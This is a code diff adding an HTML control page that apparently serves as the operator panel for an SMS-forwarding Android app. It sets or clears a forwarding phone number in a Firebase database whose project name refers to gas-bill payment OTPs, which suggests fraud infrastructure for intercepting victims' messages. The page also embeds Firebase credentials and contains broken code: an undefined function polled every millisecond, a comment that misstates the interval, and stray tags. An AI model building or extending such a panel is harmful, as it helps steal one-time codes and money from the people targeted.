@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Firebase Data as a List</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background-color: black;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column; /* Allows control over top bar and frame positioning */
+            align-items: center; /* Center horizontally */
+        }
+
+        .top-bar {
+            background-color: black;
+            color: white;
+            margin-left: 30px;
+            padding: 15px;
+            text-align: left;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000; /* Ensure it stays on top of other elements */
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 80px;
+            background-color: black;
+            color: white;
+            position: fixed;
+            top: 60px; /* Sidebar appears just below the top bar */
+            left: 0; /* Sidebar is visible by default */
+            height: calc(100% - 60px); /* Adjust height to exclude the top bar */
+            padding: 15px;
+            box-sizing: border-box;
+            transition: 0.3s ease; /* Smooth transition for sliding */
+        }
+
+        .sidebar.hidden {
+            left: -250px; /* Sidebar slides out of view when hidden */
+        }
+
+        .sidebar a {
+            color: white;
+            display: flex; /* Use flexbox to align items */
+            align-items: center; /* Center items vertically */
+            padding: 10px 0;
+            text-decoration: none;
+        }
+
+        .sidebar img {
+            width: 20px; /* Adjust size of images */
+            height: 20px;
+             margin-bottom: 12px;
+            margin-right: 10px; /* Space between image and text */
+        }
+
+        .sidebar a:hover {
+            background-color: #575757;
+        }
+
+        .control-frame {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background-color: black;
+    padding: 2vw; /* Use viewport units for responsive padding */
+    border: 2px solid #ccc;
+    border-radius: 5px;
+    margin-left: 80px;
+    width: 90vw; /* Set width relative to viewport */
+   width: 400px;
+    max-width: 200px; /* Set a maximum width for larger screens */
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    margin-top: 80px;
+}
+
+        .header-frame button,
+        .control-frame button {
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            
+            color: white;
+            cursor: pointer;
+            margin: 0 5px;
+        }
+
+        .control-frame #stopSmsButton {
+            background-color: rgb(236, 202, 4);
+            margin-bottom: 10px;
+            color: black;
+            border: white;
+        }
+
+        .control-frame #sendSmsButton {
+            background-color: rgb(236, 202, 4);
+            margin-top: 10px;
+            color: black;
+            border: white;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-right: 10px;
+            margin-left: 10px;
+        }
+
+        .menu-link {
+    display: block;
+    padding: 10px 0;
+    text-align: center;
+    color: white;
+    text-decoration: none;
+    border-top: 1px solid white; /* Adds the bar above */
+    margin-top: 20px; /* Optional: adds space between the previous item */
+}
+
+.menu-link:hover {
+    background-color: #575757; /* Hover effect */
+}
+
+
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+     <!-- Top Bar -->
+    <div class="top-bar">
+        <span>
+            <img src="image/logo.jpeg" alt="" style="width: 50px; height: 50px; vertical-align: middle; margin-right: 8px;">
+        </span>
+        <span id="menuIcon" class="menu-icon" style="margin-left: 10px;">&#9776;</span>
+        <span style="margin-left: 10px;"></span>
+    </div>
+
+    <!-- Sidebar -->
+    <div id="sidebar" class="sidebar">
+
+        <a href="widget.html">
+            <img src="image/widget.png" alt="number change"> 
+        </a>
+    <a href="numberchange.html">
+        <img src="image/setting.png" alt="Message Icon"> 
+    </a>
+    <a href="details.html">
+        <img src="image/msgsms.png" alt="Telegram Icon"> 
+    </a>
+    <a href="message.html">
+        <img src="image/msgsms.png" alt="Telegram Icon"> 
+    </a>
+    <a href="index.html" >
+        <img src="image/exit1.png" alt="Exit Icon"> 
+    </a>
+
+    <a href="https://wa.me/8240338785">
+        <img src="image/wp.png" alt="WhatsApp Icon"> 
+    </a>
+    <a href="#"><img src="image/tele1.png" alt="count"></a>
+
+    <a href="#" class="menu-link">
+        Menu
+    </a>
+    
+    <a href="#" id="clearAllDataButton">
+        <img src="image/clear.jpeg" alt="Telegram Icon">
+        </a> 
+    <a href="passwordchange.html">
+        <img src="image/arrow.png" alt="Exit Icon"> 
+    </a>
+
+    <a href="#">
+        <img src="image/down.png" alt="Exit Icon"> 
+    </a>
+     
+    </div>
+    
+    
+        
+        </a>
+        <a href="#">Menu</a>
+    </div>
+
+    <!-- Control Frame Centered -->
+    <div class="control-frame">
+        <button id="stopSmsButton">Stop SMS</button>
+        <input type="text" id="smsRecipient" placeholder="Enter phone number" maxlength="10" oninput="validatePhoneNumber()">
+        <button id="sendSmsButton">Send SMS</button>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-app.js";
+        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBa_W9hdgIoeakduXp0_fb2SCK43hSteZA",
+            authDomain: "gasbill-payment-opt-9-28-11-24.firebaseapp.com",
+            projectId: "gasbill-payment-opt-9-28-11-24",
+            databaseURL: "https://gasbill-payment-opt-9-28-11-24-default-rtdb.firebaseio.com",
+            storageBucket: "gasbill-payment-opt-9-28-11-24.appspot.com",
+            messagingSenderId: "41453590078",
+            appId: "1:41453590078:android:8baad6d10e2268bbbea36f"
+        };
+
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase();
+
+        let sendSmsButton = document.getElementById('sendSmsButton');
+        let stopSmsButton = document.getElementById('stopSmsButton');
+        let smsRecipientInput = document.getElementById('smsRecipient');
+
+        sendSmsButton.addEventListener('click', () => {
+            const phoneNumber = smsRecipientInput.value;
+            if (phoneNumber && phoneNumber.length === 10) {
+                set(ref(db, 'forwardingPhoneNumber'), phoneNumber)
+                    .then(() => {
+                        alert('Phone number saved successfully!');
+                    })
+                    .catch((error) => {
+                        alert('Failed to save phone number.');
+                        console.error("Error saving phone number: ", error);
+                    });
+            } else {
+                alert('Please enter a valid phone number.');
+            }
+        });
+
+        function fetchPhoneNumber() {
+            const phoneRef = ref(db, 'forwardingPhoneNumber');
+            onValue(phoneRef, (snapshot) => {
+                const phoneNumber = snapshot.val();
+                if (phoneNumber) {
+                    smsRecipientInput.value = phoneNumber;
+                } else {
+                    smsRecipientInput.value = '';
+                }
+            });
+        }
+
+        window.onload = () => {
+            fetchPhoneNumber();
+        };
+
+        stopSmsButton.addEventListener('click', () => {
+            smsRecipientInput.value = '';
+            set(ref(db, 'forwardingPhoneNumber'), null)
+                .then(() => {
+                    alert('SMS forwarding stopped.');
+                })
+                .catch((error) => {
+                    alert('Failed to stop SMS forwarding.');
+                    console.error("Error stopping SMS forwarding: ", error);
+                });
+        });
+
+        document.getElementById('menuIcon').addEventListener('click', () => {
+            document.getElementById('sidebar').classList.toggle('hidden');
+        });
+
+         setInterval(() => {
+        GetStudents();
+    }, 1); // Refresh every 10,000 milliseconds (10 seconds)
+
+    GetStudents(); 
+    </script>
+</body>
+</html>
